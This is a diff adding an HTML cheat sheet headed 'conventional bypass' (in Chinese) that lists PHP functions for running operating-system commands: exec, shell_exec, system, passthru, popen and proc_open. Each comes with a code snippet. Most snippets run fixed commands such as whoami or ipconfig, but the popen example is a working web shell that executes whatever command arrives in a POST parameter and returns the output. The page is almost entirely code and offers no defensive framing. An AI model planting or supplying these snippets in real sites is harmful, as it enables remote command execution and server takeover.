@@ -1,0 +1,20 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csF493745C{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:italic;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="常规绕过"><span class="csF493745C">常规绕过</span></a></h1>
+		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1. exec</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;echo exec(&#39;whoami&#39;);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">2. shell_exec</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;echo shell_exec(&#39;whoami&#39;);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">3. system</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;system(&#39;whoami&#39;);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">4. passthru</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;passthru(&quot;whoami&quot;);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">5. popen</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$command=$_POST[&#39;cmd&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$handle = popen($command , &quot;r&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(!feof($handle))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;echo fread($handle, 1024); &nbsp;//fread($handle, 1024);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;} &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;pclose($handle);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">6. proc_open</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$command=&quot;ipconfig&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$descriptorspec = array(1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$handle = proc_open($command ,$descriptorspec , $pipes);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(!feof($pipes[1]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;echo fread($pipes[1], 1024); //fgets($pipes[1],1024);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}?&gt;</span></p></body>
+</html>
